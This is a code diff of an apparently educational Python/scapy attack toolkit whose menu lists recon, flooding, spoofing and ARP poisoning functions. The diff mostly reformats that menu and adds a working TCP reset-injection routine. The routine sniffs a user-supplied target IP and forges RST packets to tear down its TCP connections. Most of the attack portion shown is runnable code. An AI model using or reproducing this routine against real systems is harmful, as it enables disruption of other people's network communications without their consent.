@@ -4,22 +4,22 @@ from scapy.layers.inet import IP, UDP, TCP, ICMP
 
 def attack_to_perform(number):
     switch = {
-        1: perform_reconnaissance,          # first recon attack
-        2: perform_reconnaissance,          # second recon attack
-        3: perform_dos,                     # first dos attack
-        4: perform_dos,                     # second dos attack
-        5: perform_dos,                     # third dos attack
-        6: perform_ftp_attack,              # ftp attack
-        7: perform_sweep,                   # ip address sweep
-        8: perform_port_scan,               # port scan
-        9: perform_ip_spoofing,             # ip spoofing
-        10: perform_os_discovery,           # os discovery
-        11: perform_syn_flood_attack,       # syn flood attack
-        12: perform_icmp_flood_attack,      # icmp flood attack
-        13: perform_udp_flood_attack,       # udp flood attack
-        14: perform_drop_communication,     # drop communication
-        15: perform_arp_poisoning,          # arp poisoning
-        16: perform_special_attack          # special attack
+        1: perform_reconnaissance,  # first recon attack
+        2: perform_reconnaissance,  # second recon attack
+        3: perform_dos,  # first dos attack
+        4: perform_dos,  # second dos attack
+        5: perform_dos,  # third dos attack
+        6: perform_ftp_attack,  # ftp attack
+        7: perform_sweep,  # ip address sweep
+        8: perform_port_scan,  # port scan
+        9: perform_ip_spoofing,  # ip spoofing
+        10: perform_os_discovery,  # os discovery
+        11: perform_syn_flood_attack,  # syn flood attack
+        12: perform_icmp_flood_attack,  # icmp flood attack
+        13: perform_udp_flood_attack,  # udp flood attack
+        14: perform_drop_communication,  # drop communication
+        15: perform_arp_poisoning,  # arp poisoning
+        16: perform_special_attack,  # special attack
     }
 
     if number in switch:
@@ -329,18 +329,42 @@ def perform_udp_flood_attack(ip_addr=None, port=None):
 def perform_drop_communication(ip_addr=None):
     if not ip_addr:
         # Get input from the user
-        ip_addr = input("Enter the IP address to scan: ")
+        ip_addr = input("Enter the IP address to attack: ")
 
-    """
-    packet1 = IP(dst="192.168.1.1") / ICMP(type=3, code=1) 
-    packet2 = IP(dst="192.168.1.2") / ICMP(type=3, code=1)
-    send(packet1)
-    send(packet2)
-    """
+    # Create a packet filter to capture packets from the specified IP address
+    filter_str = "ip src {}".format(ip_addr)
 
-    ## Alternativa Style Ethical Hacking -> scan automatica e drop comunication
+    # Sniff packets and execute RST attack
+    def packet_handler(packet):
+        if packet.haslayer(TCP):
+            if packet.haslayer(Raw):
+                tcp_seg_len = len(packet.getlayer(Raw).load)
+            else:
+                tcp_seg_len = 0
 
-    return "Drop communication performed on " + ip_addr
+            # Create a TCP RST packet to reset the connection
+            rst_packet = TCP(
+                sport=packet[TCP].sport,
+                dport=packet[TCP].dport,
+                flags="R",
+                seq=packet[TCP].seq + tcp_seg_len,
+                ack=packet[TCP].ack + tcp_seg_len,
+            )
+
+            # Send the RST packet
+            send(IP(src=packet[IP].dst, dst=packet[IP].src) / rst_packet, verbose=0)
+
+            # Print the dropped communication
+            print(
+                "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}".format(
+                    packet[IP].src, packet[IP].dst, packet[TCP].sport, packet[TCP].dport
+                )
+            )
+
+    # Start sniffing packets and call the packet_handler for each captured packet
+    sniff(filter=filter_str, prn=packet_handler)
+
+    return "Drop communication performed on IP address: {}".format(ip_addr)
 
 
 # (15) Code to perform ARP poisoning
